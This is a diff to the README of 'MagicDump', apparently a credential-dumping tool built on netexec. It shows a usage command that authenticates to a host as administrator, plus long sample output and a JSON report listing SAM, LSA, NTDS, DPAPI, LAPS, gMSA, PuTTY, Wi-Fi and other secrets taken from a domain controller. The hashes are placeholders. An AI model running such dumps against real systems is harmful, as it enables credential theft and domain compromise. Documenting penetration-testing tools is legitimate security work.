@@ -107,7 +107,7 @@ Pass-the-Hash:
 
 Local auth:
 ```bash
-./MagicDump -t 192.168.1.120 -u administrator -p P@ssw0rd --local-auth
+./MagicDump -t 192.168.1.100 -u administrator -p P@ssw0rd --local-auth
 ```
 
 Pass-the-Ticket (Kerberos auth):
@@ -125,7 +125,7 @@ Kerberos auth with password:
 Output:
 ```bash
 ==============================
-       MagicDump v1.0       
+       MagicDump v2.0       
 ==============================
 [INFO] Starting MagicDump against target 192.168.1.100
 [INFO] Authenticating as user 'administrator'...
@@ -133,20 +133,72 @@ Output:
 [LOG] Operation: SAM, Status: success
 [INFO] SAM dump saved to ~/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt
 [SAM HASHES FOUND]:
-SMB                      192.168.1.100    445    HOST               administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::
-SMB                      192.168.1.100    445    HOST               Guest:501:aad3b435b51404eeaad3b435b51404ee:abcdefabcdefabcdefabcdefabcdef:::
-SMB                      192.168.1.100    445    HOST               DefaultUser:503:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::
+SMB                      192.168.1.100    445    DC               administrator:500:FAKEHASH1:0123456789ABCDEF0123456789ABCDEF:::
+SMB                      192.168.1.100    445    DC               Guest:501:FAKEHASH2:ABCDEFABCDEFABCDEFABCDEFABCDEF:::
+SMB                      192.168.1.100    445    DC               defaultuser:503:FAKEHASH3:DEADBEEFDEADBEEFDEADBEEFDEADBEEF:::
 [INFO] Starting LSA dump using netexec...
 [LOG] Operation: LSA, Status: success
-[INFO] LSA dump saved to ~/.magicdump/dumps/192.168.1.100/LSA_192.168.1.100.txt
+[INFO] LSA dump saved to ~/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt
 [LSA SECRETS FOUND]:
-SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes256-cts-hmac-sha1-96:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes128-cts-hmac-sha1-96:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
-SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:des-cbc-md5:cccccccccccccccc
-SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:plain_password_hex:d41d8cd98f00b204e9800998ecf8427e
-SMB                      192.168.1.100    445    HOST               NL$KM:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-SMB                      192.168.1.100    445    HOST               EXAMPLE\service_user:ServicePass123
-[INFO] Dumping complete. Logs saved to ~/.magicdump/logs/192.168.1.100/report_192.168.1.100_20250105080107.json.
+SMB                      192.168.1.100    445    DC               COMPANY\DC$:aes256-cts-hmac-sha1-96:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+SMB                      192.168.1.100    445    DC               COMPANY\DC$:aes128-cts-hmac-sha1-96:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+SMB                      192.168.1.100    445    DC               COMPANY\DC$:des-cbc-md5:CCCCCCCCCCCCCCCC
+SMB                      192.168.1.100    445    DC               COMPANY\DC$:plain_password_hex:D41D8CD98F00B204E9800998ECF8427E
+SMB                      192.168.1.100    445    DC               NL$KM:DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
+SMB                      192.168.1.100    445    DC               COMPANY\svc_user:ServicePass!
+[INFO] Starting NTDS dump using drsuapi...
+[LOG] Operation: NTDS, Status: success
+[INFO] NTDS dump saved to ~/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt
+[NTDS DUMP COMPLETED]:
+[NTDS HASHES FOUND]:
+SMB                      192.168.1.100    445    DC               administrator:500:FAKENTDS1:0123456789ABCDEF0123456789ABCDEF:::
+SMB                      192.168.1.100    445    DC               Guest:501:FAKENTDS2:ABCDEFABCDEFABCDEFABCDEFABCDEF:::
+SMB                      192.168.1.100    445    DC               krbtgt:502:FAKENTDS3:7C032C3E2657F4554BC7AF108BD5EF17:::
+SMB                      192.168.1.100    445    DC               user1:1103:FAKENTDS4:06207752633F7509F8E2E0D82E838699:::
+[INFO] Starting LAPS dump using LDAP...
+[LOG] Operation: LAPS, Status: success
+[INFO] LAPS dump saved to ~/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt
+[LAPS PASSWORDS FOUND]:
+No LAPS passwords found.
+[INFO] Starting DPAPI dump...
+[LOG] Operation: DPAPI, Status: success
+[INFO] DPAPI dump saved to ~/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt
+[DPAPI SECRETS FOUND]:
+  -> Found 4 decrypted masterkeys.
+Domain:batch=TaskScheduler:Task:{FAKE-GUID} - COMPANY\administrator:FAKEDPAPI
+[INFO] Starting GPP dump...
+[LOG] Operation: GPP Autologin, Status: success
+[LOG] Operation: GPP Password, Status: success
+[INFO] GPP dump saved to ~/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt
+[INFO] Starting gMSA credential dump...
+[LOG] Operation: gMSA, Status: success
+[INFO] gMSA credentials dump saved to ~/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt
+[INFO] Starting KeePass discovery...
+[LOG] Operation: KeePass_Discovery, Status: success
+[INFO] KeePass discovery results saved to ~/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt
+[WARNING] KeePass installation detected, but no config path found!
+[INFO] Starting Veeam password dump...
+[LOG] Operation: Veeam_Credentials, Status: success
+[INFO] Veeam credentials saved to ~/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt
+[INFO] Starting WinSCP credential dump...
+[LOG] Operation: WinSCP_Credentials, Status: success
+[INFO] WinSCP credentials saved to ~/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt
+[INFO] Starting PuTTY credential & private key dump...
+[LOG] Operation: PuTTY_Credentials, Status: success
+[INFO] PuTTY credentials and private keys saved to ~/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt
+[INFO] Starting RDCMan credential dump...
+[LOG] Operation: RDCMan_Credentials, Status: success
+[INFO] RDCMan credentials saved to ~/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt
+[INFO] Starting Wi-Fi password dump...
+[LOG] Operation: WiFi_Passwords, Status: success
+[INFO] Wi-Fi passwords saved to ~/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt
+[INFO] Starting SCCM dump (disk method)...
+[LOG] Operation: SCCM, Status: success
+[INFO] SCCM dump (disk) saved to ~/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt
+[INFO] Starting Token Broker Cache dump...
+[LOG] Operation: TokenBrokerCache, Status: success
+[INFO] Token Broker Cache dump saved to ~/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt
+[INFO] Dumping complete. Logs saved to ~/.magicdump/logs/192.168.1.100/report_192.168.1.100_TIMESTAMP.json.
 ```
 
 <br>
@@ -160,25 +212,119 @@ SMB                      192.168.1.100    445    HOST               EXAMPLE\serv
 ```json
 {
   "target_host": "192.168.1.100",
-  "operation_time": "2025-01-05T07:28:58Z",
+  "operation_time": "2025-02-12T08:02:52Z",
   "credentials_dumped": {
     "SAM": {
       "status": "success",
-      "file_path": "/home/user/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt"
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt"
     },
     "LSA": {
       "status": "success",
-      "file_path": "/home/user/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt"
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt"
+    },
+    "NTDS": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt",
+      "method": "ntdsutil"
+    },
+    "LAPS": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt",
+      "method": "laps"
+    },
+    "DPAPI": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt"
+    },
+    "GPP Autologin": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt"
+    },
+    "GPP Password": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt"
+    },
+    "gMSA": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt"
+    },
+    "KeePass_Discovery": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt",
+      "method": "keepass_discover"
+    },
+    "Veeam_Credentials": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt",
+      "method": "veeam"
+    },
+    "WinSCP_Credentials": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt",
+      "method": "winscp"
+    },
+    "PuTTY_Credentials": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt",
+      "method": "putty"
+    },
+    "RDCMan_Credentials": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt",
+      "method": "rdcman"
+    },
+    "WiFi_Passwords": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt",
+      "method": "wifi"
+    },
+    "SCCM": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt",
+      "method": "disk"
+    },
+    "TokenBrokerCache": {
+      "status": "success",
+      "file_path": "/home/pascal/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt",
+      "method": "wam"
     }
   },
-  "warnings": [],
+  "warnings": [
+    "KeePass installation detected, but no config path found!"
+  ],
   "logs": [
     "Starting MagicDump against target 192.168.1.100",
     "Authenticating as user 'administrator'...",
     "Starting SAM dump using netexec...",
-    "SAM dump saved to /home/user/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt",
+    "SAM dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt",
     "Starting LSA dump using netexec...",
-    "LSA dump saved to /home/user/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt"
+    "LSA dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/LSA_dump_192.168.1.100.txt",
+    "Starting NTDS dump using drsuapi...",
+    "NTDS dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/NTDS_dump_192.168.1.100.txt",
+    "Starting LAPS dump using LDAP...",
+    "LAPS dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/LAPS_dump_192.168.1.100.txt",
+    "Starting DPAPI dump...",
+    "DPAPI dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/DPAPI_dump_192.168.1.100.txt",
+    "Starting GPP dump...",
+    "GPP dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/GPP_dump_192.168.1.100.txt",
+    "Starting gMSA credential dump...",
+    "gMSA credentials dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/gMSA_dump_192.168.1.100.txt",
+    "Starting KeePass discovery...",
+    "KeePass discovery results saved to /home/pascal/.magicdump/dumps/192.168.1.100/KeePass_Discovery_192.168.1.100.txt",
+    "Starting Veeam password dump...",
+    "Veeam credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/Veeam_Credentials_192.168.1.100.txt",
+    "Starting WinSCP credential dump...",
+    "WinSCP credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/WinSCP_Credentials_192.168.1.100.txt",
+    "Starting PuTTY credential & private key dump...",
+    "PuTTY credentials and private keys saved to /home/pascal/.magicdump/dumps/192.168.1.100/PuTTY_Credentials_192.168.1.100.txt",
+    "Starting RDCMan credential dump...",
+    "RDCMan credentials saved to /home/pascal/.magicdump/dumps/192.168.1.100/RDCMan_Credentials_192.168.1.100.txt",
+    "Starting Wi-Fi password dump...",
+    "Wi-Fi passwords saved to /home/pascal/.magicdump/dumps/192.168.1.100/WiFi_Passwords_192.168.1.100.txt",
+    "Starting SCCM dump (disk method)...",
+    "SCCM dump (disk) saved to /home/pascal/.magicdump/dumps/192.168.1.100/SCCM_dump_192.168.1.100.txt",
+    "Starting Token Broker Cache dump...",
+    "Token Broker Cache dump saved to /home/pascal/.magicdump/dumps/192.168.1.100/TokenBrokerCache_192.168.1.100.txt"
   ]
 }
 ```
